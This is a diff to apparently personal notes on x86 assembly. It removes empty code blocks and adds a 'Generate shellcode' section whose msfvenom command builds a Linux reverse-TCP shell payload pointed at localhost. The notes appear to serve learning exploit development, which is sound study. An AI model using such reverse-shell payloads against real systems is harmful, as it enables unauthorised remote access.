@@ -183,17 +183,7 @@ FS -> Extra Segment  - 16-bit - Extra segments
 GS -> Extra Segment  - 16-bit - Extra segments 
 ```
 
-```nasm
-```
 
-```nasm
-```
-
-```nasm
-```
-
-```nasm
-```
 
 ## Write Hello World in x86 Intel assembly
 
@@ -233,4 +223,16 @@ compile
 ```bash
 nasm -f elf32 -o hello-world.o hello-world.asm
 ld -m elf_i386 -o hello-world hello-world.o 
+```
+
+
+## Generate shellcode 
+```bash
+msfvenom \
+  -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1337 \
+  --format c \
+  --arch x86 \
+  --platform linux \
+  --bad-chars "\x00\x09\x0a\x20" \
+  --out shellcode
 ```
